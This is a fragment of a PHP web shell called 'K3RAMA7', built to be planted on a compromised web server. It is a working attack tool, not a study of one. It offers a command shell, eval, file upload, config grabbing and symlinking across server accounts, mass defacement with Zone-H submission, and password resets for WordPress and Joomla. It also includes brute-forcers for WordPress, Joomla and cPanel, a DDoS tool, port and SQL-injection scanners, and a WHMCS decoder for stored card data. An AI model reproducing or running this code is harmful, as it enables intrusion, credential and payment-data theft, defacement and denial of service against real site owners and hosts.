...
$system = @php_uname();
// mysql
function showstat($stat) {if ($stat=="on") {return "<b><font style='color:#00ff00'>ON</font></b>";}else {return "<b><font style='color:#ff4e00'>OFF</font></b>";}}
...
?>
<html><head><link rel="SHORTCUT ICON" href="http://i1345.photobucket.com/albums/p673/Apiz_pudin/BCC6_zps90cbe07c.png"><title> K3RAMA7 </title>
...
#menu{font-family:orbitron;background: #1e83e1;
margin:5px 2px 4px 2px;
}
div #menu li:hover {cursor:pointer;
}
div#menu li:hover>ul a:hover{width:118;background:#20e0f1;
}
div#menu ul {margin:0;
padding:0;
float:left;
-moz-border-radius: 6px; border-radius: 12px;
 border:1px solid #555555;
 }
 div#menu li {position:relative;
 display:block;float:left;
 }
 div#menu li:hover>ul {left:0px;border-left:1px solid white;
 }
 ...
 div#menu a:hover{background:#20e0f1;
 font-family:orbitron;border-bottom:0px;
 }
 div#menu ul ul 
 {
 position:absolute;
 ...
 div#menu ul ul a {padding:2px 2px 2px 10px;
 height:20px;
 float:none;
...
.inputz{
	...
	border:0;
	padding:2px;
	border-bottom:1px solid #008bed;
...
.phpinfo th, th{
	background:#191919;
	border-bottom:1px solid #0790ef;
font-weight:normal;
}
...
<div class="head_info">
<table ><tr>
<td><table class="b374k_tbl"><tr><td><a href="?"><span class="b374k"><img src="http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/eef005ed-bca0-4c3d-9d45-cb7a7b2ffed4_zps9132fac1.jpg" /></span></a></td></tr><tr><td><b><b></td></tr></table></td>
<td><?php echo $buff; ?></td>
</tr></table>
</div>
<!-- head info end here -->
...
<center><div id="menu"><ul class="menu">
<a href="?<?php echo "y=".$pwd; ?>"><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1551878958_zpseb1ac5ee.png' height="13" width="32"></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=shell"><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1551988790_zps27b1c360.png' height="13" width="34"></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=upload"><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1551991102_zps591af1f2.png' height="13" width="43"></a>
<li><a><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1552017829_zpsd01e45da.png' height="13" width="36"></a>
<ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=config">>Config</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=symlink">>Symlink server</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=php">>Eval</a></li></ul></li>

<li><a><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1551993376_zpsdf7aee2f.png' height="13" width="36"></a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=jodexer">>Joomla! </a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=vb">>VBulletin</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=mass">>Mass Deface</a></li></ul></li>

<li><a><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1551994112_zps8b4986af.png' height="13" width="36"></a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=wp-reset">>WordPress</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=jm-reset">>Joomla!</a></li></ul></li>

<li><a><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1551994950_zpsd2eed8c6.png' height="13" width="69"></a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=wpbrute">>WordPress</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=jbrute">>Joomla!</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=brute">>Cpanel</a></li></ul></li>

<li><a><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1551995813_zpsd12cb0bc.png' height="13" width="40"></a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=dos">>DOSER</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=tool">>Metasploit</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=port-sc">>Port Scanner</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=sqli-scanner">>SQLi Scanner</a>
<li><a href="?<?php echo "y=".$pwd; ?>&amp;x=jss">>Joomla Scan</a></li></ul></li>

<li><a><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1551997062_zps16fb4d5b.png' height="13" width="80"></a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=whmcs">>WHMCS </a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=hash">>Password </a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=hashid">>Hash ID</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=string">>Script Encode</a></li></ul></li>

<li><a><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1551997814_zpsd3fa78f0.png' height="13" width="32"></a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=domain">>Domain List</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=adfin">>Admin Finder</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=whois">>WHOIS Lookup</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=phpinfo">>PHP Info</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=dump">>Database Dump</a></li></ul></li>

<li><a><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1551998537_zps07e13f90.png' height="13" width="40"></a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=bypass">>Bypasser</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=bypass-cf">>CloudFlare</a></li></ul></li>

<li><a><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1551999361_zpsa3673012.png' height="13" width="32"></a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=cgi">>CgiShell</a></li>
<li><a href="?<?php echo "y=".$pwd;?>&amp;x=cgi2012">>CGI Telnet</a></li></ul></li>

<a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit"><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1552000061_zps2471e92b.png' height="13" width="55"></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mail"><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1552000625_zps3a0a1a35.png' height="13" width="42"></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=python"><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1552001380_zps22958a1f.png' height="13" width="42"></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=zone"><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1552005099_zps7c1d0e77.png' height="13" width="42"></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=about"><img src='http://i1368.photobucket.com/albums/ag193/Keramat_Durjana/cooltext1552005723_zpsa71025d2.png' height="13" width="42"></a></ul>
...
<tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Read!" name="submitcmd" /></td></tr></form>
</table>
</form>
...
<?php
echo "<center/><br/><b><font color=#00eaff> Mysql Interface </font></b><br><br>";
  mkdir('mysql', 0755);
    chdir('mysql');
        $akses = ".htaccess";
        $buka_lah = "$akses";
        $buka = fopen ($buka_lah , 'w') or die ("Error!");
...
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="K3RAMA7@fbi.gov" name="mail_from" />&nbsp; from</td></tr>
    ...
    foreach($a1 as $user )
    {
        ...
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            ...
            {
                echo "K3RAMA7~ user is (<b><font color=green>$user</font></b>) Password is (<b><font color=green>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<hr><b>Cpanel Found: <font color=green>$ok</font></b>";
...
<input name="page" type="hidden" value="find"><table>      				
    </strong><br><br><center><font size="5" style="italic" color="#00eaff"> Cpanel BruteForce </font></center><br><br>
    <table width="600" border="0" cellpadding="3" cellspacing="1" align="center">
	<tr>
	<td valign="top" bgcolor="#1dc3f9" class="style2" style="width: 139px">
	<center><b><font size="5" style="italic" color="#00fff6">Cpanel BruteForce</font></b></center></td></tr>
    <tr>
    <td>
    <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
    <td valign="top" bgcolor="#1dc3f9" class="style2" style="width: 139px">
	<strong>User :</strong></td>
    <td valign="top" bgcolor="#1dc3f9" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="usernames"><?php system('ls /var/mail');?></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#1dc3f9" class="style2" style="width: 139px">
	<strong>Pass :</strong></td>
    <td valign="top" bgcolor="#1dc3f9" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="passwords"></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#1dc3f9" class="style2" style="width: 139px">
	<strong>Type :</strong></td>
    <td valign="top" bgcolor="#1dc3f9" colspan="5">
    ...
    <tr>
    <td valign="top" bgcolor="#1dc3f9" style="width: 139px"></td>
    <td valign="top" bgcolor="#1dc3f9"  colspan="5"><strong><input class ='inputzbut' type="submit" value="start">
    </strong>
    </td>
    <tr>
</form> 
<tr>
    <td valign="top" bgcolor="#1dc3f9" class="style1" colspan="6"><strong>Get Config :</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="mendapatkan" type="hidden" value="passwd">        				
    ...
    <tr>
    <td valign="top" bgcolor="#1dc3f9" style="width: 139px"><strong>Folder Name :</strong></td>
    <td valign="top" bgcolor="#1dc3f9"><strong><input class ='inputz' size="35" name="foldername" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#1dc3f9" style="width: 139px"></td>
    <td valign="top" bgcolor="#1dc3f9" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>   
<tr>
    <td valign="top" bgcolor="#1dc3f9" class="style1" colspan="6"><strong>Get Wordlist</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="pass" type="hidden" value="password">        				
    ...
    <tr>
    <td valign="top" bgcolor="#1dc3f9" style="width: 139px"><strong>URL Config :</strong></td>
    <td valign="top" bgcolor="#1dc3f9"><strong><input class ='inputz' size="35" name="url" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
...
<tr>
    <td valign="top" bgcolor="#1dc3f9" class="style1" colspan="6"><strong>Info 
	Security</strong></td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#1dc3f9" style="width: 139px"><strong>Safe Mode</strong></td>
    <td valign="top" bgcolor="#1dc3f9" colspan="5">
	<strong>
<?php
...
?>	
    ...
    <tr>
    <td valign="top" bgcolor="#1dc3f9" style="width: 139px"><strong>Disable Function</strong></td>
    <td valign="top" bgcolor="#1dc3f9" colspan="5">
	<strong>
<form method="POST" target="_blank">
	<strong>
...
{
echo "<font color=#00eaff>No Security for Function</font></b>";
}else{
echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
echo "<font color=red>$func</font></b>";
echo '<tr><td valign="top" bgcolor="#1dc3f9" style="width: 139px"></td>';
echo '<td valign="top" bgcolor="#1dc3f9" colspan="5"><strong><input type="submit" value="Please Click Here First!">
    </strong>
    </td></tr>';
}
...
<br><br><br><p align="center"><b><font size="3">Enter Target IP</font></b></p><br>
<form method="POST">
...
elseif(isset($_GET['x']) && ($_GET['x'] == 'port-sc'))
   ...
   <tr>
		<td>Host</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00eaff;" name="host" value="localhost"/></td>
   </tr>
   <tr>
		<td>Port start</td>
		<td><input type="text" class="inputz" style="width:220px;color:#00eaff;" name="start" value="0"/></td>
   </tr>
	<tr><td>Port end</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00eaff;" name="end" value="5000"/></td>
   </tr><td><input class="inputzbut" type="submit" style="color:#00eaff" value="Scan Ports" />
...
echo '<tr><th colspan="2">Password Encryption</th></center></tr>';
echo '<tr><td><b>Enter text you want to encrypt:</b></td>';
...
echo "
<br><center><font size='5' color='#00eaff'><b> WHMCS Decoder </b></font></center>
<center>
<br>
...
<tr><td>db_host </td><td><input type='text' style='color:#00eaff;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#00eaff;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#00eaff;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#00eaff;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#00eaff;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#00eaff;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";
...
<input type="text" class="inputz" name="defacer" value="Defacer Name" />
<select name="hackmode" class="inputz" >
<option >------------------------Please Choose Any------------------------</option>
...
echo '<center>';
	...
	echo "[+] Sites Successfully Submitted to ZONE-H !! ";
...
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00eaff'>Correct 
...
{
echo "<center/><br/><b><font color=#00eaff> Mass Deface </font></b><br>";
error_reporting(0);?>
...
<center><b><font color="lime"> Joomla BruteForce </font></b><br /><br />
...
Thanks to Procoder'z Team Albanian<br></center></table>
</form></center>
<? 
@set_time_limit(0); 
...
elseif(isset($_GET['x']) && ($_GET['x'] == 'vb'))
   ...
   <b><font color="#00eaff"> VB Index Changer </font></b>
   </div><br>
   <?
...
<?php
echo "<center/><br/><b><font color=#00eaff> Command  Bypass Exploit </font></b><br>
";
print_r('
<pre>
<form method="POST" action="">
<b><font color=#00eaff><b><font color="#00eaff">Command  :</font></font></b><input name="baba" type="text" class="inputz" size="34"><input type="submit" class="inputzbut" value="Go">
</form>
<form method="POST" action=""><strong><b><font color="#00eaff">Menu Bypass  :  </font></strong><select name="liz0" size="1" class="inputz">
...
function randomt() {
    ...
    */
    ...
    <center><br><br>
    <font color="#00eaff" size='+3'><b>  Joomla Index Changer </b></font><br><br>
    </center>
    <center><b>
...
echo "<center/><br/><b><font color=#00eaff> Config Shell Priv8 SCR </font></b><br><br>";
...
echo "<center/><br/><b><font color=#00eaff>  Wordpress Password Reset </font></b><br><br>";
...
echo "<center/><br/><b><font color=#00eaff>  Joomla Password Reset </font></b><br><br>";
	if(empty($_POST['pwd'])){
echo "<FORM method='POST'><table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to MySQL server </th></tr> <tr><td>&nbsp;&nbsp;Host</td><td>
...
Progress: <span id="verified">0</span> / <span id="total">0</span><br />
<b>Found :<br /></b>
</div> <!-- /tube -->
</div></center><!-- /green -->
<br clear="all" /><br />
...
foreach($pathes as $path) {
    ...
    if(check($path) == 0) show('not found', 1, 0, 'logbox', 0);
        ...
        show('<span style="color: #00eaff;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
...
<center>
<br><Br><b><font size='2' > Wordpress BruteForce </font><br>
...
<center><br><br><br>
Your IP: <font color="red"><b><?php echo $my_ip; ?></b></font>&nbsp;(Don't DOS yourself noob)<br><br>
<table class="tabnet" style="width:333px;padding:0 1px;">
<th colspan="5">DDOS Tool</th>
<tr><tr><td>Target IP</td><td>:</td>
...
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Failed to access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#00eaff' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
...
{
$name = "<div style=' color: #00eaff ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>
...
elseif(isset($_GET['x']) && ($_GET['x'] == 'whois'))
   ...
   if($connect)
   {
   echo " $ip : $o_port ??? <u style=\"color: #00eaff\">Open</u> <br /><br />";
   flush();
   }
   }
   }
   ...
   echo '
    ...
    <tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:#00eaff;background-color:#000000" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:#00eaff;background-color:#000000" name="scan" value="Scan !" /></td></tr>
    </table></form></div>';
   if(isset($_POST['scan']))
   {
   $site = @htmlentities($_POST['site']);
   if (empty($site)){die('<br /><br /> IP not entered!');}
...
elseif(isset($_GET['x']) && ($_GET['x'] == 'about'))
	...
	<center><br><br>
    <br><br><br>	<br><br><font size="5" color="#00eaff">Thanks to:</font></center><center>
<marquee direction="up" scrollamount="2" bgcolor="" width="250" height="40"><center>
<p><b><font size="3" color="#00eaff">|---------------My Friends---------------|<br><br>Tiada Nama<br>Tony Mota<br>Black404<br>Black Vells<br>Sage Eye<br>Macho Alex<br>Cyber Virus<br>
./Humble One<br>Asad Waseem<br>Saif Ali<br>4313<br>Just In<br>Cyberdroid<br>OMB<br>Elizabeth<br>AnonQ<br>
And All Black CyberSec Crew Members<br>

<br>|---------------Greetz----------------|<br><br>
Black CyberSec Crew<br>
Members Only<br>
Macho CyberCrime<br>
Black Assasin Crew<br>
Cybergeddon Crew<br>
Code Newbie<br>
Sarawak Cyber<br>Phantom Crew<br>Putera Army Rileks Crew<br>United Muslim Of Cyber Army<br>Harimau Malaya Cyber Army<br>
Kelantan Hacking Crew<br>
Indonesia Cyber Army<br>
Garuda Cyber Attacker<br>
</font></b></p>
</center>
...
echo '<br><br><center><form method="post" action=""><b><font color="green">Dork : </font></b> &nbsp;&nbsp;<input class="inputz" type="text" value="" name="dork" style="color:#00eaff;background-color:#000000" size="20"/><input class="inputzbut" type="submit" style="color:#00eaff;background-color:#000000" name="scan" value="Scan"></form></center>';
...
echo '<center><b><font color="#E10000">Found : </font><a href="'.$url.'" target="_blank">'.$url.'</a><font color=#00eaff> &#60;-- SQLI Vuln 
